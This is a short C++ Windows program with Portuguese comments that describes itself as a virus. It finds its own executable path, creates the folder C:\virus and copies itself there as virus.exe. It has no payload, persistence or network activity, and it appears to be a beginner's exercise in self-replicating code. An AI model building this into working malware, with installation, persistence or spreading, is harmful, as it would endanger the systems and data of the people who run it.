#include <string>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <Windows.h>

std::string getAbsoluteFilePosition()
{
    char buffer[MAX_PATH];

    GetModuleFileNameA(NULL, buffer, MAX_PATH);

    return std::string(buffer);
}

bool createDestinationFolder(std::string virusAbsoluteDirectoryName){

    // Cria a a pasta de destino do vírus
    const auto entry = std::filesystem::directory_entry(virusAbsoluteDirectoryName);
    if (!entry.exists())
    {
        bool suc = std::filesystem::create_directory(entry);
        return suc;
    }
    return true;
}

int main(/* int argc, char * argv[] */)
{
    // Console reconhece UTF8
    SetConsoleOutputCP(CP_UTF8);

    // pasta para o vírus.
    std::string virusAbsoluteDirectoryName = "C:\\virus";
    std::string virusAbsoluteFileName = virusAbsoluteDirectoryName + "\\virus.exe";
    std::string executableAbsoluteFileName = getAbsoluteFilePosition();

    if (!createDestinationFolder(virusAbsoluteDirectoryName)) {
        std::cout << "Erro ao criar pasta de instalação do vírus." << std::endl; 
        exit(1);
    }

    std::ifstream src(executableAbsoluteFileName, std::ios::binary);
    std::ofstream dst(virusAbsoluteFileName, std::ios::binary);

    dst << src.rdbuf();

    return 0;
}
